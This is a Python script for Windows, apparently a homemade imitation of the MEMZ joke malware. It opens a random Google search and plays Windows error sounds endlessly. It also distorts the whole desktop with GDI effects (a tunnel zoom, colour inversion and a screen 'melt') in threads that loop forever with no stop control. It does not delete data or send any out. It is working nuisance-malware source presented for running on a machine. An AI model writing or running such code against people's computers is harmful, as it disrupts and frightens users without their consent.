import webbrowser
import pyautogui
import pygame
import win32gui
import win32con
import win32api
import ctypes
import time
import random
import threading

# === Part 1: Open Browser and Search Funny Stuff ===
def open_browser():
    queries = [
        "Floppa",
        "dank memes",
        "virus-free-download",
        "cursed images",
        "Bombs"
    ]
    query = random.choice(queries)
    webbrowser.open(f"https://www.google.com/search?q={query}")

# === Part 2: Play Random Windows Noises ===
def play_sounds():
    pygame.init()
    sounds = [
        "C:\\Windows\\Media\\Windows Ding.wav",
        "C:\\Windows\\Media\\Windows Error.wav",
        "C:\\Windows\\Media\\Windows Exclamation.wav",
        "C:\\Windows\\Media\\Windows Balloon.wav",
    ]
    while True:
        sound = random.choice(sounds)
        pygame.mixer.Sound(sound).play()
        time.sleep(random.uniform(1.0, 3.5))

# === Part 3: MEMZ Tunnel Effect ===
def memz_tunnel():
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)

    while True:
        width = win32api.GetSystemMetrics(0)
        height = win32api.GetSystemMetrics(1)
        for i in range(0, 20):
            win32gui.StretchBlt(
                hdc,
                5, 5,
                width - 10, height - 10,
                hdc,
                0, 0,
                width, height,
                win32con.SRCCOPY
            )
            time.sleep(0.05)

# === Part 4: Invert Screen Colors ===
def invert_colors():
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)
    while True:
        width = win32api.GetSystemMetrics(0)
        height = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, win32con.NOTSRCCOPY)
        time.sleep(1.5)

# === Part 5: Other GDI Effects ===
def screen_melt():
    hwnd = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(hwnd)
    width = win32api.GetSystemMetrics(0)
    height = win32api.GetSystemMetrics(1)

    while True:
        x = random.randint(0, width - 200)
        y = random.randint(0, height - 100)
        win32gui.BitBlt(hdc, x, y, 200, 5, hdc, x, y + random.randint(5, 15), win32con.SRCCOPY)
        time.sleep(0.03)

# === Start All Chaos ===
def start_chaos():
    open_browser()

    threading.Thread(target=play_sounds, daemon=True).start()
    threading.Thread(target=memz_tunnel, daemon=True).start()
    threading.Thread(target=invert_colors, daemon=True).start()
    threading.Thread(target=screen_melt, daemon=True).start()

    # Keep script alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    start_chaos()
